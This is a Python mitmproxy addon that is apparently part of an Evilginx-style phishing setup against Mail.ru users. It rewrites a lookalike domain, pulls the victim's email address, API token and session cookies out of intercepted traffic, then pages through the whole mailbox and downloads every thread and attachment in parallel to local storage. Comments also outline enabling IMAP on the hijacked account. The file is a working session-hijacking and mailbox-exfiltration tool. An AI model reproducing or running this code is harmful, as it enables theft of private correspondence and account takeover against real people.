from http.cookiejar import CookieJar
from mitmproxy import http
from mitmproxy.coretypes.multidict import MultiDictView
import requests
import logging
import requests
import time
import sys

from requests.models import CaseInsensitiveDict
from requests.sessions import RequestsCookieJar
import json
import re
import os
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from urllib.parse import urlparse, parse_qs

GET_AUTH_HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
}

TRIGGER_URL = "https://auth.mail.ru/sdc?from=https%3A%2F%2Faccount.mail.ru%2F"
TEST_URL = "https://id.mail.ru/security"

COUNTER_VID_URL = "https://top-fwz1.mail.ru/counter"
TRACKER_VID_URL = "https://top-fwz1.mail.ru/tracker"
ID_SDCS_URL = "https://id.mail.ru/sdc?token="
E_MAIL_SDCS_URL = "https://e.mail.ru/sdc"

# 1. Get sdcs cookie for account.mail.ru
# 2. Get sdcs cookie for id.mail.ru
# 3. Send request to id.mail.ru/api/v1/tokens with sdcs
# 4. Get action token in respoce
# 5. Send request to account.mail.ru/api/v1/tokens with action token + sdcs
# 6. Get action token in responce
# 7. Send request to account.mail.ru/api/v1/user/edit to turn on the IMAP


class Run:
    def __init__(self):
        self.AUTH_COOKIES: dict = {}
        self.VID = ""
        self.MPOP = ""
        self.EMAIL_SDCS = ""
        self.USERNAME = ""
        self.PASSWORD = ""
        self.SOTA_TOKEN = ""
        self.THREAD_IDS = set()
        self._flow_executed = False

    def _parse_json_object(self, text: str):
        try:
            obj = json.loads(text)
        except Exception:
            # Try to trim to first/last braces if there is extra noise
            try:
                start = text.find("{")
                end = text.rfind("}")
                if start != -1 and end != -1 and end > start:
                    obj = json.loads(text[start : end + 1])
                else:
                    return None
            except Exception:
                return None
        if isinstance(obj, str):
            # Sometimes JSON is double-encoded
            try:
                obj2 = json.loads(obj)
                if isinstance(obj2, dict):
                    return obj2
                return None
            except Exception:
                return None
        if not isinstance(obj, dict):
            return None
        return obj

    def _create_safe_email_name(self, email: str) -> str:
        """
        Create a safe directory name from an email address.

        Args:
            email: Email address to convert

        Returns:
            Safe directory name in format: username_domain
        """
        if "@" not in email:
            # If no @ symbol, treat as username only
            return self._sanitize_string(email)

        # Split email into username and domain parts
        username, domain = email.split("@", 1)

        # Sanitize both parts
        safe_username = self._sanitize_string(username)
        safe_domain = self._sanitize_string(domain)

        return f"{safe_username}_{safe_domain}"

    def _sanitize_string(self, text: str) -> str:
        """
        Sanitize a string for use in directory names.

        Args:
            text: String to sanitize

        Returns:
            Sanitized string safe for directory names
        """
        return text.replace(".", "_").replace("-", "_").replace("+", "_")

    def request(self, flow: http.HTTPFlow) -> None:
        if flow.request.pretty_url.startswith(
            "https://img.imgsmail.ru/hb/e.rumail.digital/"
        ):
            self.rewriteUrl(flow)

        # # get sdcs for account.mail.ru
        # if flow.request.pretty_url.startswith(TRIGGER_URL):
        #     self.AUTH_COOKIES = dict(flow.request.cookies)
        #     print(f"[+] auth.mail.ru cookies: \n{self.AUTH_COOKIES}\n")

        # Extract email from e.mail.ru query params
        if flow.request.pretty_url.startswith(
            "https://e.mail.ru/api/v1/utils/xray/batch"
        ):
            print("[+] Extracting email from e.mail.ru query params\n")
            try:
                parsed = urlparse(flow.request.pretty_url)
                q = parse_qs(parsed.query)
                email = (q.get("email") or [None])[0]
                if email:
                    self.USERNAME = email
                    print(f"[+] Email extracted from e.mail.ru: {self.USERNAME}\n")
                    self._maybeExecuteFlow(flow)
            except Exception as e:
                print(f"[!] Failed to extract email from auth.mail.ru: {e}\n")

    def response(self, flow: http.HTTPFlow) -> None:
        # if flow.request.pretty_url.startswith(TRIGGER_URL):
        #     self.MPOP = self.extractCookie(flow, "Mpop=")
        #     print(f"[+] Mpop is extracted: {self.MPOP}\n")

        # Extract token from e.mail.ru inbox HTML -> script#sota.config JSON
        if flow.request.pretty_url.startswith("https://e.mail.ru/inbox"):
            try:
                print("[+] Extracting SOTA token from e.mail.ru inbox HTML\n")
                html = flow.response.get_text()

                # with open(
                #     "/home/sh4d3/amsul/projects/mailru/inbox.html",
                #     "w",
                #     encoding="utf-8",
                # ) as f:
                #     f.write(html)
                # print("[+] Saved inbox HTML to inbox.html\n")

                match = re.search(
                    r'<script[^>]*id=["\']sota.config["\'][^>]*>(.*?)</script>',
                    html,
                    flags=re.IGNORECASE | re.DOTALL,
                )

                print(f"[+] Match found: {match}\n")
                if not match:
                    print("[!] Could not find script#sota.config in inbox HTML\n")
                else:
                    cfg_text = match.group(1).strip()
                    cfg = json.loads(cfg_text)
                    token_candidate = cfg.get("userConfig", {}).get("api", [])
                    token_value = None
                    if isinstance(token_candidate, list) and token_candidate:
                        token_value = (
                            token_candidate[0]
                            .get("data", {})
                            .get("body", {})
                            .get("token")
                        )

                    if token_value:
                        self.SOTA_TOKEN = token_value
                        print(f"[+] SOTA token extracted: {self.SOTA_TOKEN}\n")
                        self._maybeExecuteFlow(flow)
                    else:
                        print("[!] Parsed sota.config but token not found\n")
            except Exception as e:
                print(f"[!] Failed to parse inbox HTML for token: {e}\n")

        # if flow.request.pretty_url.startswith(E_MAIL_SDCS_URL):
        #     self.EMAIL_SDCS = self.extractCookie(flow, "sdcs=")
        #     print(f"[+] SDCS for e.mail.ru is extracted: {self.EMAIL_SDCS}\n")
        #     self._maybeExecuteFlow(flow)

        # if flow.request.pretty_url.startswith(COUNTER_VID_URL):
        #     vid = self.extractCookie(flow, "VID=")
        #     if vid is None:
        #         return

        #     self.VID = vid
        #     print(f"[+] VID is extracted: {self.VID}\n")

        # Capture thread ids from smart threads list
        if flow.request.pretty_url.startswith(
            "https://e.mail.ru/api/v1/threads/status/smart"
        ):
            print("[+] Capturing thread ids from smart threads list\n")
            payload_text = flow.response.get_text()
            payload = self._parse_json_object(payload_text)
            if payload is None:
                print("[!] Failed to parse smart threads response JSON\n")
            else:
                threads = payload.get("body", {}).get("threads", [])
                ids = [
                    t.get("id") for t in threads if isinstance(t, dict) and t.get("id")
                ]
                if ids:
                    before_count = len(self.THREAD_IDS)
                    self.THREAD_IDS.update(ids)
                    added = len(self.THREAD_IDS) - before_count
                    print(
                        f"[+] Collected {len(ids)} thread ids, added {added} new (total {len(self.THREAD_IDS)})\n"
                    )
                    # Persist to file for reuse
                    try:
                        with open(
                            "/home/sh4d3/amsul/projects/mailru/thread_ids.json",
                            "w",
                            encoding="utf-8",
                        ) as f:
                            json.dump(
                                sorted(list(self.THREAD_IDS)),
                                f,
                                ensure_ascii=False,
                                indent=2,
                            )
                        print("[+] Saved thread ids to thread_ids.json\n")
                    except Exception as e:
                        print(f"[!] Failed to save thread ids: {e}\n")

                    # Start pagination to fetch all threads
                    self._fetchAllThreads(flow)
                else:
                    print("[!] No thread ids found in smart threads response\n")

    def _fetchAllThreads(self, flow: http.HTTPFlow) -> None:
        """Fetch all threads using pagination"""

        # Extract parameters from the original request
        parsed = urlparse(flow.request.pretty_url)
        query_params = parse_qs(parsed.query)

        # Build base parameters
        base_params = {
            "folder": query_params.get("folder", ["0"])[0],
            "limit": "50",  # Increased limit
            "filters": query_params.get("filters", ["{}"])[0],
            "sort": query_params.get("sort", ['{"type":"date","order":"desc"}'])[0],
            "last_modified": query_params.get("last_modified", ["1"])[0],
            "force_custom_thread": query_params.get("force_custom_thread", ["true"])[0],
            "with_thread_representations": query_params.get(
                "with_thread_representations", ["false"]
            )[0],
            "supported_custom_metathreads": query_params.get(
                "supported_custom_metathreads", ['["tomyself"]']
            )[0],
            "remove_emoji_opts": query_params.get(
                "remove_emoji_opts",
                [
                    '{"remove_from_sender_name":true,"remove_from_snippet":true,"remove_from_subject":true}'
                ],
            )[0],
            "email": self.USERNAME,
            "htmlencoded": query_params.get("htmlencoded", ["false"])[0],
            "token": self.SOTA_TOKEN,
            "_": str(int(time.time() * 1000)),
        }

        # Create session with cookies from the original flow
        session = requests.Session()
        cookies = requests.cookies.RequestsCookieJar()
        for name, value in flow.request.cookies.items():
            cookies.set(name, value)

        # Headers from the original request
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Referer": "https://e.mail.ru/inbox/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
        }

        # Fetch all threads using pagination with limit 50
        offset = 50  # Start from offset 50 (since we already have first 50)
        all_thread_ids = set(self.THREAD_IDS)

        while True:
            params = base_params.copy()
            params["offset"] = str(offset)

            try:
                print(f"[+] Fetching 50 threads with offset {offset}")
                resp = session.get(
                    "https://e.mail.ru/api/v1/threads/status/smart",
                    headers=headers,
                    cookies=cookies,
                    params=params,
                    timeout=30,
                )

                if resp.status_code != 200:
                    print(
                        f"[!] Failed to fetch threads at offset {offset}: HTTP {resp.status_code}"
                    )
                    break

                data = resp.json()
                if not isinstance(data, dict) or data.get("status") != 200:
                    print(
                        f"[!] Invalid response at offset {offset}: {data.get('status', 'unknown')}"
                    )
                    break

                threads = data.get("body", {}).get("threads", [])
                if not threads:
                    print(
                        f"[+] No more threads found at offset {offset}, pagination complete"
                    )
                    break

                # Extract thread IDs
                new_ids = [
                    t.get("id") for t in threads if isinstance(t, dict) and t.get("id")
                ]
                if not new_ids:
                    print(
                        f"[+] No valid thread IDs found at offset {offset}, pagination complete"
                    )
                    break

                # Add new IDs
                before_count = len(all_thread_ids)
                all_thread_ids.update(new_ids)
                added = len(all_thread_ids) - before_count

                print(
                    f"[+] Found {len(new_ids)} threads at offset {offset}, added {added} new (total {len(all_thread_ids)})"
                )

                # If we got fewer threads than requested, we've reached the end
                if len(new_ids) < 50:
                    print(f"[+] Reached end of threads (got {len(new_ids)} < 50)")
                    break

                offset += 50

            except Exception as e:
                print(f"[!] Error fetching threads at offset {offset}: {e}")
                break

        # Update the global thread IDs
        self.THREAD_IDS = all_thread_ids
        print(
            f"[+] Pagination complete. Total threads collected: {len(self.THREAD_IDS)}"
        )

        # Save updated thread IDs
        try:
            with open(
                "/home/sh4d3/amsul/projects/mailru/thread_ids.json",
                "w",
                encoding="utf-8",
            ) as f:
                json.dump(
                    sorted(list(self.THREAD_IDS)),
                    f,
                    ensure_ascii=False,
                    indent=2,
                )
            print("[+] Updated thread_ids.json with all threads\n")
        except Exception as e:
            print(f"[!] Failed to save updated thread ids: {e}\n")

        # Now execute the flow with all threads
        self._maybeExecuteFlow(flow)

    def _isReady(self) -> bool:
        return bool(self.USERNAME and self.SOTA_TOKEN and self.THREAD_IDS)

    def _maybeExecuteFlow(self, flow: http.HTTPFlow) -> None:
        if self._flow_executed:
            return
        if self._isReady():
            print(f"[+] Requirements ready, executing flow...\n")
            self._flow_executed = True
            self.executeFlow(flow)

    def executeFlow(self, flow: http.HTTPFlow):
        # Use the latest cookies from the current flow
        if not self.THREAD_IDS:
            print("[!] No thread IDs collected yet; skipping thread fetch\n")
            return
        if not self.SOTA_TOKEN:
            print("[!] Missing SOTA token; skipping thread fetch\n")
            return
        if not self.USERNAME:
            print("[!] Missing USERNAME; skipping thread fetch\n")
            return

        # cookies = self.buildCookies(dict(flow.request.cookies))
        # if getattr(self, "EMAIL_SDCS", None):
        #     cookies.set("sdcs", self.EMAIL_SDCS)

        cookies = flow.request.cookies

        headers = dict(GET_AUTH_HEADERS)
        headers["Host"] = "e.mail.ru"

        # Create timestamp-based directory structure
        from datetime import datetime

        # Generate timestamp string in format: YYYY-MM-DD_HHMMSS
        timestamp_str = datetime.now().strftime("%Y-%m-%d_%H%M%S")

        # Create safe directory name from email
        safe_email_name = self._create_safe_email_name(self.USERNAME)

        # Build full directory path
        out_dir = f"/home/sh4d3/amsul/projects/mailru/thread_details/{timestamp_str}_{safe_email_name}"
        try:
            os.makedirs(out_dir, exist_ok=True)
            print(f"[+] Created output directory: {out_dir}\n")
        except Exception as e:
            print(f"[!] Failed to create output directory: {e}\n")

        total = 0
        success = 0

        session = requests.Session()
        try:
            adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50)
            session.mount("https://", adapter)
            session.mount("http://", adapter)
        except Exception:
            pass

        def fetch_and_save(thread_id: str) -> bool:
            params = {
                "quotes_version": "1",
                "id": thread_id,
                "offset": "0",
                "last_modified": "1",
                "force_custom_thread": "true",
                "use_color_scheme": "1",
                "remove_emoji_opts": json.dumps(
                    {
                        "remove_from_sender_name": True,
                        "remove_from_snippet": True,
                        "remove_from_subject": True,
                    }
                ),
                "disable_quotation_parser": "true",
                "email": self.USERNAME,
                "htmlencoded": "false",
                "token": self.SOTA_TOKEN,
                "_": str(int(time.time() * 1000)),
            }

            # print(headers)
            # print(cookies)
            resp = session.get(
                "https://e.mail.ru/api/v1/threads/thread",
                headers=headers,
                cookies=cookies,
                params=params,
                timeout=20,
            )
            try:
                data = resp.json()
                if isinstance(data, dict) and data.get("status") == 403:
                    print(
                        f"[!] JSON status 403 for {thread_id}. Body: {data.get('body')}\n"
                    )
            except Exception as e:
                print(f"[!] Failed to parse JSON for {thread_id}: {e}")
                print(f"[!] Status: {resp.status_code}, Headers: {dict(resp)}")
                print(f"[!] Content: {resp.text[:500]}...")
                return False
            safe_id = thread_id.replace(":", "_")
            out_path = os.path.join(out_dir, f"{safe_id}.json")
            with open(out_path, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)

            # Download attachments if present (in parallel per thread)
            try:
                attach_dir = os.path.join(out_dir, f"{safe_id}_attachments")
                os.makedirs(attach_dir, exist_ok=True)
                body = data.get("body", {})
                messages_raw = (
                    body.get("messages", []) if isinstance(body, dict) else []
                )

                # Handle different message structures:
                # 1. Simple array: [msg1, msg2, msg3]
                # 2. Array with numeric keys: [{0: msg1}, {1: msg2}, {2: msg3}]
                messages = []
                for item in messages_raw:
                    if isinstance(item, dict):
                        # Check if it's a simple message object
                        if "id" in item:
                            messages.append(item)
                        # Check if it's an object with numeric keys containing messages
                        else:
                            for key, value in item.items():
                                if (
                                    key.isdigit()
                                    and isinstance(value, dict)
                                    and "id" in value
                                ):
                                    messages.append(value)

                downloads = []
                print(f"[+] Processing {len(messages)} messages in thread {thread_id}")

                # First, collect attachments from thread-level response
                for i, msg in enumerate(messages):
                    msg_id = msg.get("id", f"msg_{i}")
                    attaches = (msg.get("attaches") or {}).get("list") or []
                    print(
                        f"[+] Message {msg_id} has {len(attaches)} attachments (thread level)"
                    )
                    for att in attaches:
                        hrefs = att.get("href") or {}
                        url = hrefs.get("download") or hrefs.get("view")
                        name = att.get("name") or "attachment.bin"
                        if url:
                            downloads.append((url, name))
                            print(f"[+] Found attachment: {name}")

                # Then, fetch individual message details for messages with attachments
                def fetch_message_details(msg):
                    msg_id = msg.get("id")
                    folder_id = msg.get("folder")
                    flags = msg.get("flags", {})

                    # Only fetch details for messages that have attach flag set to true
                    if not msg_id or not folder_id or not flags.get("attach", False):
                        return []

                    msg_params = {
                        "quotes_version": "1",
                        "id": msg_id,
                        "folder_id": str(folder_id),
                        "use_color_scheme": "1",
                        "remove_emoji_opts": "{}",
                        "disable_quotation_parser": "true",
                        "email": self.USERNAME,
                        "htmlencoded": "false",
                        "token": self.SOTA_TOKEN,
                        "_": str(int(time.time() * 1000)),
                    }

                    try:
                        # Retry logic with exponential backoff
                        max_retries = 2
                        for attempt in range(max_retries):
                            try:
                                timeout = 20  # 20s for both attempts
                                msg_resp = session.get(
                                    "https://e.mail.ru/api/v1/messages/message",
                                    headers=headers,
                                    cookies=cookies,
                                    params=msg_params,
                                    timeout=timeout,
                                )
                                msg_data = msg_resp.json()
                                break  # Success, exit retry loop
                            except Exception as e:
                                if attempt == max_retries - 1:  # Last attempt
                                    raise e
                                time.sleep(2**attempt)  # 1s, 2s, 4s delay

                        if isinstance(msg_data, dict) and msg_data.get("status") == 200:
                            msg_body = msg_data.get("body", {})
                            msg_attaches = (msg_body.get("attaches") or {}).get(
                                "list"
                            ) or []
                            msg_downloads = []
                            for att in msg_attaches:
                                hrefs = att.get("href") or {}
                                url = hrefs.get("download") or hrefs.get("view")
                                name = att.get("name") or "attachment.bin"
                                if url:
                                    msg_downloads.append((url, name))
                            return msg_downloads
                        else:
                            return []
                    except Exception as e:
                        print(f"[!] Error fetching message {msg_id}: {e}")
                        return []

                # Filter messages that have attach flag set to true
                messages_with_attachments = [
                    msg
                    for msg in messages
                    if msg.get("flags", {}).get("attach", False) == True
                ]

                # Fetch message details in parallel only for messages with attachments
                if messages_with_attachments:
                    from concurrent.futures import (
                        ThreadPoolExecutor as _TPE,
                        as_completed as _as_completed,
                    )

                    with _TPE(max_workers=min(4, len(messages_with_attachments))) as ex:
                        msg_futures = [
                            ex.submit(fetch_message_details, msg)
                            for msg in messages_with_attachments
                        ]
                        for fut in _as_completed(msg_futures):
                            try:
                                msg_downloads = fut.result()
                                downloads.extend(msg_downloads)
                            except Exception as e:
                                print(f"[!] Error processing message details: {e}")

                if downloads:

                    def _fetch_attachment(url: str, name: str) -> bool:
                        try:
                            print(f"[+] Downloading attachment: {name}")
                            r = session.get(
                                url, headers=headers, cookies=cookies, timeout=60
                            )
                            if r.status_code == 200:
                                file_path = os.path.join(attach_dir, name)
                                with open(file_path, "wb") as outf:
                                    outf.write(r.content)
                                print(f"[+] Saved attachment: {name} -> {file_path}")
                                return True
                            else:
                                print(
                                    f"[!] Failed to download {name}: HTTP {r.status_code}"
                                )
                                return False
                        except Exception as e:
                            print(f"[!] Error downloading {name}: {e}")
                            return False

                    from concurrent.futures import (
                        ThreadPoolExecutor as _TPE,
                        as_completed as _as_completed,
                    )

                    ok = 0
                    with _TPE(max_workers=min(8, len(downloads))) as ex:
                        futures = [
                            ex.submit(_fetch_attachment, url, name)
                            for url, name in downloads
                        ]
                        for fut in _as_completed(futures):
                            try:
                                if fut.result():
                                    ok += 1
                            except Exception:
                                pass
                    print(
                        f"[+] Attachments saved for {thread_id}: {ok}/{len(downloads)}\n"
                    )
            except Exception as e:
                print(f"[!] Attachment processing failed for {thread_id}: {e}\n")
            return True

        thread_ids = sorted(list(self.THREAD_IDS))
        total = len(thread_ids)
        max_workers = 24
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_id = {
                executor.submit(fetch_and_save, tid): tid for tid in thread_ids
            }
            for fut in as_completed(future_to_id):
                tid = future_to_id[fut]
                try:
                    if fut.result():
                        success += 1
                        print(f"[+] Saved thread {tid}\n")
                except Exception as e:
                    print(f"[!] Failed to fetch/save thread {tid}: {e}\n")

        print(f"\033[91m[+] Thread fetch complete: {success}/{total} saved\033[0m\n")
        sys.stdout.flush()

    def buildCookies(self, cookies) -> RequestsCookieJar:
        new_cookies = RequestsCookieJar()

        for k, v in cookies.items():

            if k.strip().lower() == "mpop":
                v = self.MPOP
            elif k.strip().lower() == "vid":
                v = self.VID

            new_cookies.set(k, v)

        return new_cookies

    def extractCookie(self, flow: http.HTTPFlow, name: str) -> str:
        cookies = flow.response.headers.get_all("Set-Cookie")
        cookie = next(
            (
                c.split(";", 1)[0].split("=", 1)[1]
                for c in cookies
                if c.startswith(name)
            ),
            None,
        )
        return cookie

    # fix for evilgix domain in URL processing
    def rewriteUrl(self, flow: http.HTTPFlow) -> None:
        flow.request.url = flow.request.url.replace(
            "hb/e.rumail.digital/", "hb/e.mail.ru/", 1
        )


addons = [Run()]
